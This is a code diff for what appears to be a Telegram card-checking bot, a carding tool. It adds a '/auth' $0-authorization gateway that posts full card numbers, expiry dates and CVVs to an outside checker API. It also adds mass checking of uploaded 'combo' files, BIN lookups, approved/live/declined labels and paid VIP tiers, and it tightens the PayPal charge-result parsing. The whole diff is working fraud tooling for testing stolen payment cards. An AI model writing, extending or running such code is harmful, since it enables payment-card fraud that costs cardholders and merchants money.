@@ -379,6 +379,7 @@ class PayPalCommerce:
             approve_res = self._approve_order(order_id)
             text = approve_res.text if approve_res else ''
             text_upper = text.upper()
+            text_lower = text.lower()
             
             if 'EXPIRED_CARD' in text_upper or 'EXPIRED_CREDIT_CARD' in text_upper:
                 return "EXPIRED_CARD"
@@ -388,7 +389,9 @@ class PayPalCommerce:
                 return "SUSPECTED_FRAUD"
             elif 'INSUFFICIENT_FUNDS' in text_upper:
                 return "INSUFFICIENT_FUNDS"
-            elif 'true' in text.lower():
+            elif 'error' in text_lower or 'expecting' in text_lower or 'invalid' in text_lower:
+                return "DECLINED"
+            elif 'true' in text_lower:
                 return 'CHARGE 1.0'
             elif 'ORDER_NOT_APPROVED' in text_upper:
                 return "Payer cannot pay for this transaction."
@@ -416,7 +419,8 @@ async def check_card_api(card_full, gateway_url):
                 return pp_engine.Charge(card_full)
             result_raw = await loop.run_in_executor(None, run_check)
             result = str(result_raw).lower()
-            if "true" in result or "charge" in result or "success" in result:
+            
+            if "true" in result or "charge 1" in result or "charge $" in result or "charged" in result:
                 return "approved", result_raw
             elif "insufficient" in result:
                 return "live", result_raw
@@ -620,6 +624,45 @@ def check_square_sync(card):
     finally:
         session.close()
 
+def check_auth_sync(card):
+    try:
+        session = requests.Session()
+        session.verify = False
+        data = MultipartEncoder({'data': (None, card),})
+        headers = {
+            'authority': 'uncoder.eu.org',
+            'accept': '*/*',
+            'accept-language': 'ar-CA,ar;q=0.9,en-CA;q=0.8,en;q=0.7,en-US;q=0.6',
+            'content-type': data.content_type,
+            'origin': 'https://uncoder.eu.org',
+            'referer': 'https://uncoder.eu.org/cc-checker/',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+        }
+        start_time = time.time()
+        response = session.post('https://uncoder.eu.org/cc-checker/api.php', headers=headers, data=data)
+        end_time = time.time()
+        taken = round(end_time - start_time, 2)
+        
+        try:
+            json_data = response.json()
+            message = json_data.get('message', '')
+            
+            if 'approved' in message.lower():
+                return {'status': 'approved', 'message': 'Approved — $0 auth', 'taken': taken}
+            elif 'insufficient' in message.lower():
+                return {'status': 'live', 'message': 'Insufficient Funds', 'taken': taken}
+            else:
+                return {'status': 'declined', 'message': message[:80], 'taken': taken}
+        except:
+            return {'status': 'error', 'message': 'Error parsing response', 'taken': taken}
+    except Exception as e:
+        return {'status': 'error', 'message': str(e)[:50], 'taken': 0}
+    finally:
+        try:
+            session.close()
+        except:
+            pass
+
 # ============ لوحة الأزرار ============
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -654,6 +697,7 @@ async def free_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE)
 • /pp [card] - PayPal single
 • /st [card] - Stripe single
 • /sq [card] - Square single
+• /auth [card] - Auth $0 check
 • /stop - Stop mass
 • /code [key] - Activate VIP"""),
         parse_mode="HTML",
@@ -668,7 +712,8 @@ async def vip_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         premium_emoji("""💎 VIP COMMANDS:
 • Upload combo file - Mass checking
 • /st [card] - Stripe single
-• /sq [card] - Square single"""),
+• /sq [card] - Square single
+• /auth [card] - Auth $0 check"""),
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
@@ -705,6 +750,7 @@ async def check_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYP
         [InlineKeyboardButton("💳 PayPal", callback_data="check_paypal")],
         [InlineKeyboardButton("💳 Stripe", callback_data="check_stripe")],
         [InlineKeyboardButton("💳 Square", callback_data="check_square")],
+        [InlineKeyboardButton("🛡 Auth $0", callback_data="check_auth")],
         [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")],
     ]
     await query.edit_message_text(
@@ -727,6 +773,11 @@ async def check_square_callback(update: Update, context: ContextTypes.DEFAULT_TY
     query = update.callback_query
     await query.answer()
     await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/sq [card]</code>"), parse_mode="HTML")
+
+async def check_auth_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.edit_message_text(premium_emoji("🛡 Send card:\n<code>/auth [card]</code>"), parse_mode="HTML")
 
 async def stats_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -862,6 +913,7 @@ async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • Upload combo file - Mass checking
 • /st [card] - Stripe single
 • /sq [card] - Square single
+• /auth [card] - Auth $0 check
 
 🤖 FREE:
 • /start - Start
@@ -869,6 +921,7 @@ async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • /pp [card] - PayPal single
 • /st [card] - Stripe single
 • /sq [card] - Square single
+• /auth [card] - Auth $0 check
 • /stop - Stop mass
 • /code [key] - Activate VIP"""
     await update.message.reply_text(premium_emoji(commands_text), parse_mode="HTML")
@@ -1113,6 +1166,58 @@ async def format_square_response(card_full, result, taken, user_id, mode="Single
 - - - - - - - - - - - - - - - - - - - - - -
 [⌤] Dev by: WAFA 🍀""")
 
+async def format_auth_response(card_full, result_dict, taken, user_id, mode="Single"):
+    bin_number = card_full.split("|")[0][:6]
+    info, bank, country = await get_bin_info(bin_number)
+    status = result_dict.get('status', 'declined')
+    message = result_dict.get('message', '')
+    if status == "approved":
+        status_text = "Approved 🔥💎"
+    elif status == "live":
+        status_text = "Live ✅✨"
+    else:
+        status_text = "Declined ❌"
+    if user_id in ADMINS:
+        user_status = "Admin 👑"
+    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
+        user_status = "Premium 💎"
+    else:
+        user_status = "Free User 🤖"
+    return premium_emoji(f"""#Auth $0 [{mode}] 🌟
+- - - - - - - - - - - - - - - - - - - - - -
+[ϟ] Card: <code>{card_full}</code>
+[ϟ] Response: <code>{message}</code>
+[ϟ] Status: {status_text}
+[ϟ] Taken: <code>{taken}s</code>
+- - - - - - - - - - - - - - - - - - - - - -
+[ϟ] Info: <code>{info}</code>
+[ϟ] Bank: <code>{bank}</code>
+[ϟ] Country: <code>{country}</code>
+[⎇] Req By: <code>{user_id}</code> ({user_status})
+- - - - - - - - - - - - - - - - - - - - - -
+[⌤] Dev by: WAFA 🍀""")
+
+async def auth_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    ALL_USERS.add(user_id)
+    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
+        now = time.time()
+        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
+            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
+            return
+        last_check_time[user_id] = now
+    if not context.args:
+        await update.message.reply_text(premium_emoji("💡 Usage: <code>/auth [card]</code>"), parse_mode="HTML")
+        return
+    card = context.args[0]
+    msg = await update.message.reply_text(premium_emoji("🛡 Auth Checking..."), parse_mode="HTML")
+    start_time = time.time()
+    loop = asyncio.get_event_loop()
+    result_dict = await loop.run_in_executor(None, check_auth_sync, card)
+    taken = round(time.time() - start_time, 2)
+    text = await format_auth_response(card, result_dict, taken, user_id, "Single")
+    await msg.edit_text(text, parse_mode="HTML")
+
 async def st_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
@@ -1180,6 +1285,7 @@ async def handle_file_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("💳 PayPal Check", callback_data="gateway_paypal")],
             [InlineKeyboardButton("💳 Stripe Check", callback_data="gateway_stripe")],
             [InlineKeyboardButton("💳 Square Check", callback_data="gateway_square")],
+            [InlineKeyboardButton("🛡 Auth $0 Check", callback_data="gateway_auth")],
         ]
         await update.message.reply_text(premium_emoji("📁 File Received!\nChoose gateway:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
     except Exception as e:
@@ -1202,6 +1308,8 @@ async def gateway_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         task = asyncio.create_task(process_stripe_file(file_path, chat_id, context))
     elif gateway_type == "square":
         task = asyncio.create_task(process_square_file(file_path, chat_id, context))
+    elif gateway_type == "auth":
+        task = asyncio.create_task(process_auth_file(file_path, chat_id, context))
     user_tasks[user_id] = task
     del pending_files[user_id]
 
@@ -1378,6 +1486,61 @@ async def process_square_file(file_path, chat_id, context):
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
+async def process_auth_file(file_path, chat_id, context):
+    user_id = chat_id
+    stop_users[user_id] = False
+    try:
+        approved = live = declined = 0
+        card_counter = 0
+        panel_msg = await context.bot.send_message(chat_id, premium_emoji("🛡 Auth Checking..."), parse_mode="HTML")
+        loop = asyncio.get_event_loop()
+        with open(file_path, 'r', encoding='utf-8') as f:
+            lines = f.readlines()
+        for line in lines:
+            if stop_users.get(user_id):
+                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
+                return
+            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
+            if not match: continue
+            card_full = match[0]
+            card_counter += 1
+            result_dict = await loop.run_in_executor(None, check_auth_sync, card_full)
+            status = result_dict.get('status', 'declined')
+            if status == "approved":
+                approved += 1
+                text = await format_auth_response(card_full, result_dict, 0, user_id, "Mass")
+                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
+                try:
+                    await msg.pin(disable_notification=True)
+                except:
+                    pass
+            elif status == "live":
+                live += 1
+                text = await format_auth_response(card_full, result_dict, 0, user_id, "Mass")
+                await context.bot.send_message(chat_id, text, parse_mode="HTML")
+            else:
+                declined += 1
+            message = result_dict.get('message', '')
+            panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+         ▬▬ [ MASS AUTH ] ▬▬
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+✅ Approved: <code>{approved}</code>
+✅ Live: <code>{live}</code>
+❌ Declined: <code>{declined}</code>
+📊 Total: <code>{approved + live + declined}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💳 Card #{card_counter}: <code>{card_full}</code>
+📝 Result: <code>{message[:80]}</code>"""
+            try:
+                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
+            except: pass
+            await asyncio.sleep(1)
+        await context.bot.send_message(chat_id, premium_emoji("🚀 Auth complete."), parse_mode="HTML")
+    except asyncio.CancelledError:
+        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
+    except Exception as e:
+        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
+
 async def error_handler(update, context):
     pass
 
@@ -1387,6 +1550,7 @@ def main():
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("cmds", cmds))
     app.add_handler(CommandHandler("pp", pp))
+    app.add_handler(CommandHandler("auth", auth_check))
     app.add_handler(CommandHandler("stop", stop))
     app.add_handler(CommandHandler("code", code_command))
     app.add_handler(CommandHandler("wafa", wafa_command))
@@ -1412,6 +1576,7 @@ def main():
     app.add_handler(CallbackQueryHandler(check_paypal_callback, pattern="^check_paypal$"))
     app.add_handler(CallbackQueryHandler(check_stripe_callback, pattern="^check_stripe$"))
     app.add_handler(CallbackQueryHandler(check_square_callback, pattern="^check_square$"))
+    app.add_handler(CallbackQueryHandler(check_auth_callback, pattern="^check_auth$"))
     app.add_handler(CallbackQueryHandler(stats_panel_callback, pattern="^stats_panel$"))
     app.add_handler(CallbackQueryHandler(back_to_start_callback, pattern="^back_to_start$"))
     app.add_handler(CallbackQueryHandler(gate_info_callback, pattern="^gate_info_"))
